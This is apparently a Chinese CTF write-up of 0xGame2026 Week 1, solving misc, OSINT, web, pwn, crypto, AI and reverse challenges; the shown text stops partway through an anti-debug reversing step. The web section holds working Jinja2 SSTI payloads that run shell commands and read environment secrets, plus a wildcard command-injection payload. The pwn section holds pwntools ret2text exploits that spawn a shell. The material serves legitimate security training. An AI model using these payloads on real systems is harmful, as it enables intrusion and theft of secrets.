---
title: 0xGame2026 Week1 WP
date: 2026-10-15 19:48:17
tags:
    - WP
    - Misc
    - Osint
    - Web
    - pwn
    - Crypto
    - AI
    - Reverse
categories: CTF
---

本文是0xGame2026第一周的WriteUp

<!-- more -->

# I. Misc

## 一. 欢迎来到CTF的世界！

### 解题过程

下载附件`CTF入门指北.pdf`，打开观察，注意到第7页有：

> 为了奖励你的认真观看，这里有一串神秘字符送给你：
> MHhHYW1le3dlbGNvbWVfdDBfdGhlX3cwcmxkX29mX0NURiF9
> 这是什么呢？学会使用搜索引擎和AI吧！

使用base64解码即得flag。

### Flag

0xGame{welcome_t0_the_w0rld_of_CTF!}

## 二. 深夜值班室

### 解题过程

启动题目容器后，打开Minecraft1.21.11，连接服务器，地址为`nc1.ctfplus.cn:[端口号]`。

查看`值班手册`，发现指令`/ops help`。

注意到门前告示牌给出账号`nightowl`，房间角落有一打印机，告示牌提示可右键查看卡纸。

右键打印机，发现终端口令`watch2026`，至此集齐了login的账号与口令。

使用`/ops login nightowl watch2026`登录，注意到可以使用指令`/ops backup list`列出备份。使用指令发现两条备份，id为2和5。

恢复两条备份，没有得到有效信息。使用`/ops logs`发现还有一份备份，id为7。

使用`/ops backup restore --id 7`得到门禁码3117。

使用门禁码`/ops door unlock 3117`，通关，得到flag。

### Flag

动态的，每次不一样。
{% gp 2-2 %}
{% asset_img MCflag1.jpg %}
{% asset_img MCflag2.jpg %}
{% endgp %}

## 三. 奶蛙的博客

### 解题过程

开启容器，进入题给地址。注意到每一篇博客文章有一个碎片，遂手动收集。~~（因为不会写脚本）~~得到字符串：

<div class="wrap-next"></div>

```text
H4sIAAAAAAAA/wTAwQ2AMAgF0JXaADM4xo9BbQ+UA0GrMe7uK/eyjv11rpNhfLYu0OBpAvYNWsxIU0AXxYMjuA3yBGsUEWQnVE8Kp/z+AAAA//+XJ0P/SwAAAA==
```

注意到这像一段base64编码，遂使用CyberChef解码。由于开头H4sI解码后结果类似.gz的魔数，所以用CyberChef将解码结果直接保存为.gz文件。解压文件，打开文档得到flag。

PS：第一次手动提取把O看成0了还以为是题目出问题了😅

### Flag

0xGame{n41w4_l4ugh5_cr4wl5_4nd_c0ll3ct5_3v3ry_fr4gm3nt_4cr055_th3_1nt3rn3t}

## 四. ez_traffic

### 解题过程

下载附件traffic_http.pcap，使用wireshark打开。~~（看不懂~~

在筛选器中筛选http，逐条查看，注意到其中有一条显示传输了secret.zip。

右键此条，选择追踪流-HTTP Stream，得到Hex转储：

```hexdump
00000000 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d HTTP/1.1 200 OK.
00000010 0a 53 65 72 76 65 72 3a 20 6e 67 69 6e 78 2f 31 .Server: nginx/1
00000020 2e 32 34 2e 30 0d 0a 43 6f 6e 74 65 6e 74 2d 54 .24.0..C ontent-T
00000030 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69 6f 6e ype: app lication
00000040 2f 7a 69 70 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 /zip..Co ntent-Le
00000050 6e 67 74 68 3a 20 31 37 32 0d 0a 43 6f 6e 74 65 ngth: 17 2..Conte
00000060 6e 74 2d 44 69 73 70 6f 73 69 74 69 6f 6e 3a 20 nt-Dispo sition:
00000070 61 74 74 61 63 68 6d 65 6e 74 3b 20 66 69 6c 65 attachme nt; file
00000080 6e 61 6d 65 3d 22 73 65 63 72 65 74 2e 7a 69 70 name="se cret.zip
00000090 22 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 63 "..Conne ction: c
000000A0 6c 6f 73 65 0d 0a 0d 0a lose....
000000A8 50 4b 03 04 14 00 00 00 08 00 ed b1 3b 5d 68 59 PK...... ....;]hY
000000B8 37 41 36 00 00 00 34 00 00 00 0a 00 00 00 73 65 7A6...4. ......se
000000C8 63 72 65 74 2e 74 78 74 f3 f5 c8 f0 88 0c 37 cc cret.txt ......7.
000000D8 49 35 0e aa 0c 74 8f ca f5 0d f7 4b 8b 0c 37 cd I5...t.. ...K..7.
000000E8 f0 8d c8 36 4c 8c f0 4b 4b 0c 09 4b 8b ca 09 2b ...6L..K K..K...+
000000F8 8d 30 4a 37 f6 33 76 cc 48 0b b4 b5 05 00 50 4b .0J7.3v. H.....PK
00000108 01 02 14 00 14 00 00 00 08 00 ed b1 3b 5d 68 59 ........ ....;]hY
00000118 37 41 36 00 00 00 34 00 00 00 0a 00 00 00 00 00 7A6...4. ........
00000128 00 00 00 00 00 00 80 01 00 00 00 00 73 65 63 72 ........ ....secr
00000138 65 74 2e 74 78 74 50 4b 05 06 00 00 00 00 01 00 et.txtPK ........
00000148 01 00 38 00 00 00 5e 00 00 00 00 00 ..8...^. ....
```

下半部分即为secret.zip，将其Hex单独提取出来：

<div class="wrap-next"></div>

```hex
50 4b 03 04 14 00 00 00 08 00 ed b1 3b 5d 68 59 37 41 36 00 00 00 34 00 00 00 0a 00 00 00 73 65 63 72 65 74 2e 74 78 74 f3 f5 c8 f0 88 0c 37 cc 49 35 0e aa 0c 74 8f ca f5 0d f7 4b 8b 0c 37 cd f0 8d c8 36 4c 8c f0 4b 4b 0c 09 4b 8b ca 09 2b 8d 30 4a 37 f6 33 76 cc 48 0b b4 b5 05 00 50 4b 01 02 14 00 14 00 00 00 08 00 ed b1 3b 5d 68 59 37 41 36 00 00 00 34 00 00 00 0a 00 00 00 00 00 00 00 00 00 00 00 80 01 00 00 00 00 73 65 63 72 65 74 2e 74 78 74 50 4b 05 06 00 00 00 00 01 00 01 00 38 00 00 00 5e 00 00 00 00 00
```

在CyberChef中通过From Hex解码并导出为secret.zip，解压，打开文件得到base64编码：

```text
MHhHYW1le3RyQGZmMWNfYW5hMXk1aXNfaTVfZlVuX2g3N3AhfQ==
```

解码即得flag。

PS：什么叫WireShark能直接导出文件？~~又绕圈子了~~

### Flag

0xGame{tr@ff1c_ana1y5is_i5_fUn_h77p!}

## 五. Interesting_ppt

### 解题过程

下载附件0xgame.zip，解压得到0xgame.pptx。打开翻阅，发现右上角的页码从5/10直接跳到8/10，像是缺少两页。

将.pptx后缀改为.zip，解压。~~搜寻缺失页面的信息，一无所获。~~

注意到，docProps目录下的core.xml有一段隐藏信息：`a2V5PTB4R2FtZV8yMDI2`，使用base64解码可得：`key=0xGame_2026`，这指的应该是XOR的key。

而在同目录下的custom.xml中也有一段隐藏信息：
```text
fTAvKTQybl5VAXRHHA8JCygHfFZTWGYCIydUDQcBX0pVdkB3AwA3OVBnZAZpLxUJCSIZVFJYeAIiHysLPDV8AFFcYk0kUFRQEnpmCw==
```
使用base64解码并未得到可读文本，于是对解码结果使用XOR，key为UTF8的0xGame_2026，得到另一段base64：
```text
MHhHYW1le3BwdHhfMXNfanVzdF9hX3oxcF80bmRfbWV0YWRhdGFfbjN2ZXJfYjN0cjR5c195MHV9
```
再次使用base64解码即得flag。

### Flag

0xGame{pptx_1s_just_a_z1p_4nd_metadata_n3ver_b3tr4ys_y0u}

PS：什么叫题目里还有假信息？

## 六. Treasure_island

### 解题过程

开启容器，使用ssh连接服务。进入后，题目提示：`cd treasure_island to start.`，于是：
```bash
cd treasure_island
```
进入后，先查看目录内容：
```bash
ls -la
```
发现clue.txt和real_map.txt，尝试打开clue：
```text
The old captain trusted no locks, only numbers.
He spread a thousand chests across the sand,
and left the chart to remember what his chest is called.
Count what the chart keeps, and the count will name the chest.
```
~~写的啥看不懂~~

注意到目录内还有chest文件夹，直接cd，进入后`ls -la`，发现有一千个box。

直接全部查看：
```bash
tail -n +1 *.txt
```
快速浏览，注意到box_882.txt[^1]输出了不同的内容：

```text
==> box_882.txt <==
🏆 You found the real treasure chest!

The chest is empty. The gold was moved to /tmp/flag —
but a keeper's heartbeat seals it.

Somewhere on this island a heart keeps beating,
re-locking /tmp/flag with every beat.
Silence the heart, and erase its mark,
or it will never let the gold go.

(ps: the watcher below shows no mercy to half-done work.)
```

使用`ps aux`查看现有进程，注意到`/opt/.whisper/heartbeat.sh`，其PID为25，以及存在respawn.sh和watchdog.sh。由于直接结束heartbeat会使其立即被重新唤醒，所以先删除它：
```bash
rm /opt/.whisper/heartbeat.sh
```
再清除进程：
```bash
kill 25
```
这样就可以访问/tmp/flag了：
```bash
cat /tmp/flag
```
由此直接得到flag。

### Flag

（似乎是动态的）
0xGame{92e108d5-fff8-4cf6-a96f-0c7aef14011a}

## 七. 模糊的二维码

### 解题过程

下载附件QRcoooold.zip，解压得到messyQR.jpg，打开图片发现是一个拼豆拼成的部分损坏的二维码。

新建Excel表，将行列调至等宽，将图中完整部分逐像素涂入，并修补缺失的定位块。初步修复效果如图：

{% asset_img QRcodeORIG.png %}

此时二维码还无法扫描。补齐5×5的对齐块，并依照原图凭感觉补齐剩余部分的少量像素：

{% asset_img QRcode.png %}

此时二维码已经可扫描，扫描即得flag。

### Flag

0xGame{QR_c0de&3rr0r_(oRr3c7iOn}

## 八. 粗心的小x

### 解题过程

下载附件AI-chat-project.zip与chat_export.json。先查看json，发现这是一段对话，其中uesr给出了key：`sk-T7xQcGFydDE6MHhHYW1le0QwX24wdF8`，去除头部`sk-`，进行base64解码，得到的可读部分为：
```text
part1:0xGame{D0_n0t_
```
解压AI-chat-project.zip，得到一个git仓库。先阅读README.me，注意到有一行为：

> 在项目根目录的 `.env` 文件中配置 API Key（程序通过 python-dotenv 自动加载）：

遂打开.env文件，发现两个key：

> OPENAI_API_KEY=sk-W9kDcGFydDM6X3RoMW5nc190MF9nMXR9
> OLD_API_KEY=sk-F4k3VGhpc19pc19hX2Zha2Vfa2V5

分别尝试使用base64解码，得到的可读部分为：

> part3:_th1ngs_t0_g1t}
> This_is_a_fake_key

至此已获得flag的part1和3，开始寻找2。先查看git仓库的状态：
```bash
git status
```
发现`On branch main    nothing to commit, working tree clean`，于是尝试查看历史提交：
```bash
git log
```
有数条历史commit，由于只需要找到含key的commit，且注意到key的开头都为`sk-`，遂搜索：
```bash
git log -S "sk-"
```
得到两条commit，分别`git show`，两条都发现了：

> client = OpenAI(api_key="sk-m2PzcGFydDI6dXBsT0BkX3ByMXY0dDM")

两条commit，对该字段一条添加，一条删除。对key进行base64解码后得到可读部分为：
```text
part2:uplO@d_pr1v4t3
```
将三个部分拼接即得flag。

### Flag

0xGame{D0_n0t_uplO@d_pr1v4t3_th1ngs_t0_g1t}

## 九. Strange_lsb

### 解题过程

下载附件week1-misc-strange_lsb.zip，解压得到challenge.png，尝试使用zsteg，未得到有效结果。注意到提示：`单一的色彩只是噪音，唯有三原色交织之时，真相才会显现。`，结合题目名lsb，尝试使用StegSolve，分别提取R，G，B的最低位。

提取到的三张图片都为噪声，由于需要`三原色交织`，所以使用StegSolve中的Image Combiner，尝试将三张图片依次XOR，得到反色的二维码：
{% asset_img QRlsbORIG.png %}
此时二维码还无法扫描，反色得到可扫描的二维码：
{% asset_img QRlsb.png %}
扫描即得flag。

### Flag

0xGame{LSB_x0r_Pl4n3_1s_4w3s0m3!}

## 十. 小伊卡...不胖...不胖...

### 解题过程

阅读题干，注意到`一屁股把图坐扁了`描述，怀疑png宽高篡改。

使用file、binwalk、zsteg、xxd分析均未获得有效信息，尝试pngcheck，得到：
```text
File: fat_Y1k@.png (1059398 bytes)
  chunk IHDR at offset 0x0000c, length 13
    1500 x 1280 image, 24-bit RGB, non-interlaced
  CRC error in chunk IHDR (computed d2ab0767, expected b757db33)
ERRORS DETECTED in fat_Y1k@.png
```
确定了png宽高篡改。使用工具[Deformed-Image-Restorer](https://github.com/AabyssZG/Deformed-Image-Restorer)爆破原始png，得到flag。

### Flag

0xGame{w0w_thi5_1s_thE_tru3_Length}

# II. Osint

## 一. Spring的旅程-1

### 解题过程

下载附件picture.zip，解压得到eat.jpg和night.jpg。

1. 拍摄地点：注意到图中公交车车牌开头为`苏A`，所以答案为`江苏省_南京市`
2. 博客：访问博客，找到`NCTF 2026 wp`，所以答案为`https://www.springbot.top/nctf-2026-wp/`
3. 品牌与型号：右键-属性-详细信息，找到品牌与型号，答案为`HUAWEI/nova 14`
4. 拍照时间：右键-属性-详细信息，获得拍照时间，但只精确到分钟。逐个穷举秒数[^2]，最终得到正确答案：`2026年04月06日19:22:45`
5. 建筑名称：观察图片，发现图中建筑像地铁站，且为高架站。列车颜色为红色，代表2号线。遂筛选并逐个尝试南京二号线的高架站，得到答案：`马群(地铁站)`
6. 彩蛋：在`NCTF 2026 wp`的博客页面往下翻，在留言区找到彩蛋。答案：`0sint_master?`

答完题后，获得flag。

### Flag

（似乎是动态的）
0xGame{675dbe4a-0ba3-481e-b5cc-7ebf00537ef9}

## 二. Spring的旅程-2

### 解题过程

下载附件，解压，打开图片。观察图片，发现线索：梦田音乐和北山大厦
{% gp 2-2 %}
{% asset_img no-crop MENGTIAN.png %}
{% asset_img no-crop BEISHAN.png %}
{% endgp %}
在百度地图中搜索，发现两个线索指向同一处地点；再结合拍摄视角，得出：拍摄地点在杭州黄龙体育馆附近。初步框定以下范围：
{% asset_img HUANGLONG1.png %}
再次观察图片，注意到此处建筑正对镜头：
{% asset_img ZHENGDUI.png %}
在地图上结合延长线与框选范围，在附近附近逐个坐标排查：
{% asset_img HUANGLONG2.png %}
结合题给md5验证，找到正确坐标：
{% asset_img ZUOBIAO.png %}
获得flag。

### Flag

0xGame{13374315,3517141}

## 三. 至此,我将独自前行...

### 解题过程

读题，得到线索`你像窝在被子里的舒服，却又像风捉摸不住`与`2022.5.10，小狼公主永远离开了我们。`

搜索发现前者是《红色高跟鞋》的歌词，后者指向VTuber`珈乐Carol`

在其个人主页搜索`红色高跟鞋`，找到视频[【珈乐】《红色高跟鞋》翻唱【附剧情版MV】](https://www.bilibili.com/video/BV1db4y117Q1)（BV1db4y117Q1）

注意到，除了p1`正片`之外，还有p2`A.S.F.03019`，即题干提到的线索字符串。

在B站搜索`A.S.F.03019`，找到视频：[A.S.F.03019™是个啥呀](https://www.bilibili.com/video/BV1H341127zr)，翻找评论区，发现一个指向av03019的评论，而av03019（[【Alice】【みどり.ver】至此,我将独自前行…](https://www.bilibili.com/video/av03019/)）的标题正是本题标题：`至此,我将独自前行...`

至此可确定，av03019即为题干提到的秘密视频。

组合所得信息即得flag。

### Flag

0xGame{BV1db4y117Q1_A.S.F.03019_2010-02-22-20:25:24}

# III. Web

## 一. 奶蛙的博客

见前文。

## 二. ATP代码实验

### 解题过程

打开容器，进入题给链接。尝试右键，发现被禁用。尝试F12，发现被禁用。

~~手抖一下突然~~发现可以直接拖动复制。

将代码全选，拖动复制到编辑区，提交评测，获得flag。

### Flag

（似乎是动态的）
0xGame{ec86e1c4-5ddc-4e21-b7e5-1629b1db6aef}

## 三. 渲染如呼吸一样简单

### 解题过程

打开容器，进入题给链接。注意到`engine: jinja2-preview`，可以尝试使用SSTI漏洞。[^3]

- 先查看环境：`{{ cycler.__init__.__globals__.os.popen('ls -la /').read() }}`
- 发现有flag，尝试直接读取：`{{ cycler.__init__.__globals__.os.popen('cat /flag').read() }}`，但没有输出
- 注意到根目录有entrypoint.sh，尝试获取：`{{ cycler.__init__.__globals__.os.popen('cat /entrypoint.sh').read() }}`
- 发现FLAG在环境变量中，尝试获取：`{{ cycler.__init__.__globals__.os.environ.FLAG }}`
- 得到flag

### Flag

（似乎是动态的）
0xGame{d63342fa-5c72-4a0c-9cb5-e5958542b5a8}

## 四. ez_64

### 解题过程

开启容器，打开链接，看到：

```
<?php  
chdir(__DIR__);  
  
if (isset($_GET['c'])) {    $c = $_GET['c'];  
    if (preg_match("#^[/?. fla64]*$#", $c)) {        system($c);  
    } else {  
        die("no no no!");  
    }  
} else {    highlight_file(__FILE__);  
}
```

根据代码，使用GET传参`c=`时，后面的内容会直接作为命令交给shell。先尝试使用dirsearch扫描目录，注意到：
```text
200 -     0B - /flag.php
```
推测flag所在位置即为flag.php。

构造payload：通过GET传参，于是以`?`开头，根据代码，需要`c=`，而后接上`base64`命令。由于代码中只允许`/?. fla64`几个字符，因此使用`base64`命令需要进入bin。同时，不在白名单中的字符需要使用通配符`?`代替，于是需要在shell中执行的命令应当为`/???/????64 fla?.???`

于是构造出完整payload：
```
?c=/???/????64 fla?.???
```
将其添加至URL末尾，得到一串base64：
```
PD9waHAKJGZsYWcgPSAnMHhHYW1lezQ1ZjU1ZmE2LTdhZGItNDlmMC1iNWY4LTIwNmQwM2MxOTUy YX0nOwo/Pgo=
```
解码得到：
```text
<?php
$flag = '0xGame{45f55fa6-7adb-49f0-b5f8-206d03c1952a}';
?>
```

### Flag

（似乎是动态的）
0xGame{45f55fa6-7adb-49f0-b5f8-206d03c1952a}

# IV. pwn

## 一. 奇妙杂货铺

### 解题过程

打开容器，使用ncat访问。

- 进入一个shop
- 尝试购买blood bottle
- 发现可以输入数字
- 尝试输入负数
- 发现gold增多了
- 购买负数的blood bottle，至gold足够
- 购买Flag
- 获得flag

### Flag

0xGame{Welc0m3_7o_th3_pwn_w0rld!!!}

## 二. 亦步亦趋

### 解题过程

下载附件pwn，尝试打开，得到：

```text
==============================================
[Level 1] Memory Roaming: Local Variable Overwriting
==============================================
In C, local variables are stored on the stack in order.
target: using `gets` to change `magic` = 0xdeadbeef.

[-] the address of buffer `buf` is about : 0x7ffd5008ca80
[-] the address of variables `magic` is about : 0x7ffd5008ca9c
Now input your Payload:
```

这是一个栈溢出问题，题目给出buf和magic的地址，注意到它们相差0x1c，即28字节。使用pwntool：[^4]

```python
from pwn import *
# 告诉 pwntools 目标程序
context.binary = "./chall"
# 启动本地程序
p = process("./chall")
# 构造 Payload
payload = b"A" * 28
payload += p32(0xdeadbeef)
# 发送 Payload
p.sendline(payload)
# 继续和程序交互
p.interactive()
```

进入level2：

```text
==============================================
[Level 2] The real challenge: control flow! (Ret2Text)
==============================================
This time , you need to change the return address
I have prepared backdoor for you. 'win', It's addr about: 0x57de85a30209
Now input your final Payload:
```

要求我们将原本的返回地址改为给出的win。用IDA打开pwn，找到level2：

```
__int64 level2()  
{  
_BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF

puts("\n==============================================");  
puts("[Level 2] The real challenge: control flow! (Ret2Text)");  
puts("==============================================");  
puts("This time , you need to change the return address");  
printf("I have prepared backdoor for you. 'win', It's addr about: %p\n", win);  
printf("Now input your final Payload:\n> ");  
return gets(v1);  
}
```

```
int win()  
{  
puts("Congratulations! You have hijacked the control flow!");  
return system("/bin/sh");  
}
```

```
// attributes: thunk  
__int64 __fastcall gets()  
{  
return gets();  
}
```

```
-0000000000000020 // Use data definition commands to manipulate stack variables and arguments.  
-0000000000000020 // Frame size: 20; Saved regs: 8; Purge: 0  
-0000000000000020  
-0000000000000020 _BYTE var_20[32];  
+0000000000000000 _QWORD __saved_registers;  
+0000000000000008 _UNKNOWN *__return_address;  
+0000000000000010  
+0000000000000010 // end of stack variables
```

注意到`var_20[32]`位于-0x20，而`__return_address`位于+0x8，于是offset应为0x28=40

得到offset为40后使用pwntool：

```python
from pwn import *
context.binary = "./pwn"
p = process("./pwn")
# Level 1
payload = b"A" * 28
payload += p32(0xdeadbeef)
p.send(payload)
# Level 2
p.recvuntil(
    b"I have prepared backdoor for you. 'win', It's addr about: "
)
win = int(p.recvline().strip(), 16)
log.info(f"win = {hex(win)}")
p.recvuntil(b"> ")
payload = b"A" * 40
payload += p64(win)
p.sendline(payload)
p.interactive()
```

此时题目已经提示成功，但还没有成功获得flag。注意到题目有在线环境，于是开启容器，再使用pwntool：

```python
from pathlib import Path
from pwn import *
BASE_DIR = Path(__file__).resolve().parent
BIN_PATH = BASE_DIR / "pwn"
context.binary = str(BIN_PATH)
context.arch = "amd64"
HOST = "nc1.ctfplus.cn"
PORT = 23186
elf = ELF(str(BIN_PATH))
p = remote(HOST, PORT)
# Level1
payload = b"A" * 28
payload += p32(0xdeadbeef)
# Level 1 使用 read(0, buf, 0x20)
# 不能多发送 \n
p.send(payload)
# Level 2
p.recvuntil(
    b"I have prepared backdoor for you. 'win', It's addr about: "
)
win = int(p.recvline().strip(), 16)
log.info(f"win = {hex(win)}")
# 根据运行时 win 地址计算 PIE Base
win_offset = elf.sym.win
elf.address = win - win_offset
log.info(f"PIE base = {hex(elf.address)}")
# 找一个 ret gadget
rop = ROP(elf)
ret = rop.find_gadget(["ret"]).address
log.info(f"ret = {hex(ret)}")
# 等待 Level 2 输入
p.recvuntil(b"> ")
# v1 = rbp-0x20
# saved RIP = rbp+0x8
# offset = 0x28 = 40
payload = b"A" * 40
payload += p64(ret)
payload += p64(win)
p.sendline(payload)
p.interactive()
```

至此，已经拿到了shell，`ls -la`发现flag，直接cat即得flag。

### Flag

0xGame{R3t2t3xt_4nd_7th_st4ck_1s_m4gic}

# V. Crypto

## 一. 天使大人

### 解题过程

下载附件`关于邻家的天使大人不知不觉把我惯成废人这档子事.py`，复制代码到[Sage Cell Server](https://sagecell.sagemath.org/)中，选择语言为sage，执行，得到一个字符串：

> e834598ba8cf6695cc9299364fe4fa63b05a1b55f847ab5aecb6d5dc251e2b77

打开容器，使用ncat访问，提交该字符串，获得flag。

### Flag

0xGame{r34lly g00d st3p f0rw4ord}

## 二. decode for love

### 解题过程

下载附件，打开文件，发现密文是一串emoji。仔细观察，发现与base100常用的emoji不同，使用base100解码的尝试以失败告终。

阅读提示，发现有密码`0x2026`，于是使用[emoji-aes](https://emoji-aes.miaotony.xyz/)，通过0x2026作为key进行解密，得到一串base64：`TFVKVktQVU5OTEFBQQ==`

解码base64可得：LUJVKPUNNLAAA，像是凯撒密码。尝试枚举并观察结果：
```text
LUJVKPUNNLAAA
KTIUJOTMMKZZZ
JSHTINSLLJYYY
IRGSHMRKKIXXX
HQFRGLQJJHWWW
GPEQFKPIIGVVV
FODPEJOHHFUUU
ENCODINGGETTT
DMBNCHMFFDSSS
CLAMBGLEECRRR
BKZLAFKDDBQQQ
AJYKZEJCCAPPP
ZIXJYDIBBZOOO
YHWIXCHAAYNNN
XGVHWBGZZXMMM
WFUGVAFYYWLLL
VETFUZEXXVKKK
UDSETYDWWUJJJ
TCRDSXCVVTIII
SBQCRWBUUSHHH
RAPBQVATTRGGG
QZOAPUZSSQFFF
PYNZOTYRRPEEE
OXMYNSXQQODDD
NWLXMRWPPNCCC
MVKWLQVOOMBBB
```
发现一串有意义的字符串`ENCODINGGETTT`，得到flag。

### Flag

0xGame{ENCODINGGETTT}

# VI. AI

## 一. 粗心的小x

见前文

## 二. ez_pytorch

### 解题过程

下载附件attach.zip，解压得到load.py和model.pth。打开load.py，发现需要torch。在当前目录下安装pytorch的虚拟环境，激活后尝试run，发现报错：

```
Traceback (most recent call last):
  File "d:\Download\attach\load.py", line 3, in <module>
    model = torch.load("model.pth", weights_only=True)
  File "D:\Download\attach\pytorch_venv\Lib\site-packages\torch\serialization.py", line 1614, in load
    raise pickle.UnpicklingError(_get_wo_message(str(e))) from None
_pickle.UnpicklingError: Weights only load failed. This file can still be loaded, to do so you have two options, do those steps only if you trust the source of the checkpoint. 
        (1) In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
        (2) Alternatively, to load with `weights_only=True` please check the recommended steps in the following error message.
        WeightsUnpickler error: Unsupported global: GLOBAL exec was not an allowed global by default. Please use `torch.serialization.add_safe_globals([exec])` or the `torch.serialization.safe_globals([exec])` context manager to allowlist this global if you trust this class/function.
```

根据提示，将weights_only的值改为False，运行代码得到flag：

```text
你成功触发了pickle反序列化，程序输出了flag:0xGame{3z_p1ckl3_fOr_pyt0rch}!
希望你不要立刻开始下一题，能静下心搜集并了解一下pickle反序列化的原理
简单来说，pytorch底层依赖python的pickle库，而pickle库会将load对象的__reduce__方法中的内容直接翻译为虚拟机指令，因此exec+python代码即可直接被执行
这里如果改成os+命令即可实现远程RCE
安全起见，pytorch在较新版本中使用默认weights_only=True参数，使用白名单来屏蔽恶意指令。不过，最安全的方法是使用safetensors库
model loaded: None
```

### Flag

0xGame{3z_p1ckl3_fOr_pyt0rch}

# VII. Reverse[^5]

## 一. signin

### 解题过程

下载附件，解压，用IDA打开。注意到`Welcome to 0xGame2026!!`字样。按F5打开伪代码发现：
```
  _main(argc, argv, envp);
  puts_0("Welcome to 0xGame2026!!");
  puts_0("Input flag:");
  scanf("%127s", Str);
  if ( strlen(Str) == 52 )
  {
    if ( (unsigned int)check_input(Str) )
      puts_0("Correct!");
    else
      puts_0("Wrong!");
    return 0;
  }
  else
  {
    puts_0("Wrong length!");
    return 0;
  }
```
于是双击打开`check_input`，发现：
```
  for ( i = 0; i <= 51; ++i )
  {
    if ( (*(_BYTE *)(a1 + i) ^ 0x5A) != reference_data[i] )
      return 0;
  }
```
这是在对`reference_data`每个字节进行XOR，双击找到`reference_data`：
```
.rdata:00000000004040A0 reference_data  db 6Ah, 22h, 1Dh, 3Bh, 37h, 3Fh, 21h, 6Ah, 2Ah, 3Fh, 34h
.rdata:00000000004040A0                                         ; DATA XREF: check_input+2E↑o
.rdata:00000000004040AB                 db 5, 6Bh, 1Eh, 1Bh, 5, 6Eh, 34h, 3Eh, 5, 29h, 2Eh, 3Bh
.rdata:00000000004040B7                 db 28h, 2Eh, 5, 23h, 6Ah, 2Fh, 28h, 5, 28h, 3Fh, 2Ch, 3Fh
.rdata:00000000004040C3                 db 28h, 29h, 3Fh, 5, 1Fh, 34h, 3Dh, 33h, 34h, 2 dup(3Fh)
.rdata:00000000004040CE                 db 28h, 33h, 34h, 3Dh, 7Bh, 27h
```
对每个字节对0x5A进行XOR即得flag。

### Flag

0xGame{0pen_1DA_4nd_start_y0ur_reverse_Engineering!}

## 二. ez_upx

### 解题过程

下载附件并解压。根据题干，使用upx脱壳，得到output.exe，用IDA打开，在main中找到：

```c
if ( fgets(Buffer, MaxCount: 128, Stream: v4) != nullptr )
  {
    v7 = strcspn(Str: Buffer, Control: "\r\n");
    Buffer[v7] = 0;
    if ( sub_40184A(a1: Buffer) )
      puts(Buffer: "Correct! Welcome to reverse engineering.");
```

即：对输入通过`sub_40184A`校验，于是查看`sub_40184A`：

```c
  if ( strlen(Str: a1) != 29 )
    return false;
  sub_401550(a1, a2: v3, a3: 29);
  return sub_4015C7(a1: v3, a2: 29, a3: Str1) == 40
      && strcmp(Str1, Str2: "RhExDlhVDSdGGEJHKRBGGmpbGFkBMGBgLkhXTkg=") == 0;
```

输入的字符串被存储在a1中，经过`sub_401550`与`sub_4015C7`变换，最终结果应为一串40字节的base64编码，于是推测`sub_4015C7`对v3进行了base64变换，而v3由a1通过`sub_401550`变换而得。所以查看`sub_401550`：

```c
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    *(_BYTE *)(a2 + i) = aVivo50[i % 6] ^ *(_BYTE *)(a1 + i);
  }
  return result;
```

注意到，这里将a1逐字节XOR，将结果传给a2，a2再将结果向外传给v3。密钥为`aVivo50`所代表的字符串，查看该字符串发现其具体内容为：`vivo50`。

至此，我们得到了恢复flag的方式：先将`RhExDlhVDSdGGEJHKRBGGmpbGFkBMGBgLkhXTkg=`进行base64解码，再对解码结果进行XOR，key为`vivo50`，获得flag。

### Flag

0xGame{N0www_y0u_kn0w_UPX!!!}

## 三. 欸？云朵

### 解题过程

下载附件，解压。尝试打开exe，发现窗口一闪而过，于是录屏，逐帧慢放，得到flag：

{% asset_img YUNDUO.png %}

### Flag

0xGame{Dyn4m1c_1$_s0_Fun!}

## 四. 欸？云朵のrevenge

### 解题过程

下载附件，解压。将所得.exe放进DIE检查，没有发现壳。用IDA检查，打开Winmain的伪代码，首先注意到：
```c
if ( (unsigned __int8)sub_4017DC() != 0 )
    return 0;
```
如果sub_4017DC的输出不为0，则直接退出。于是查看sub_4017DC：
```c
__int64 sub_4017DC()
{
  return sub_401793();
}
```
直接调用了sub_401793，进一步追查：
```c
bool sub_401793()
{
  HANDLE CurrentProcess; // rax
  BOOL pbDebuggerPresent; // [rsp+2Ch] [rbp-4h] BYREF

  pbDebuggerPresent = false;
  CurrentProcess = GetCurrentProcess();
  return CheckRemoteDebuggerPresent(hProcess: CurrentProcess, &pbDebuggerPresent) && pbDebuggerPresent;
}
```
发现这是一个反调试，检测到调试时自动退出。在Winmain中继续往下看，不管注册和销毁窗口的部分，直接看显示字符串的逻辑，发现字符串的创建是一个复杂的过程。但注意到此处：
```c
_UNKNOWN **sub_401768()
{
  if ( IsDebuggerPresent() )
    return &off_4050C0;
  else
    return &off_405120;
}
```
是否检测到调试，会输出不同的结果。由原程序运行录像逐帧慢放可得，没有调试时，输出的是假flag，因此要想得到真flag，可以绕过此处的调试检测。此处的地址是0x401768，打开x64dbg，查找此处的地址，观察附近，发现：

```text
0000000000401768 | 55                       | push rbp                                |
0000000000401769 | 48:89E5                  | mov rbp,rsp                             |
000000000040176C | 48:83EC 20               | sub rsp,20                              |
0000000000401770 | 48:8B05 897B0000         | mov rax,qword ptr ds:[<IsDebuggerPresen | rax:NtGdiXLATEOBJ_iXlate+10
0000000000401777 | FFD0                     | call rax                                | rax:NtGdiXLATEOBJ_iXlate+10
0000000000401779 | 85C0                     | test eax,eax                            |
000000000040177B | 74 09                    | je attachment.401786                    |
000000000040177D | 48:8D05 3C390000         | lea rax,qword ptr ds:[4050C0]           | rax:NtGdiXLATEOBJ_iXlate+10, 00000000004050C0:"pP@"
0000000000401784 | EB 07                    | jmp attachment.40178D                   |
0000000000401786 | 48:8D05 93390000         | lea rax,qword ptr ds:[405120]           | rax:NtGdiXLATEOBJ_iXlate+10, 0000000000405120:"怭@"
000000000040178D | 48:83C4 20               | add rsp,20                              |
0000000000401791 | 5D                       | pop rbp                                 |
0000000000401792 | C3                       | ret                                     |
```

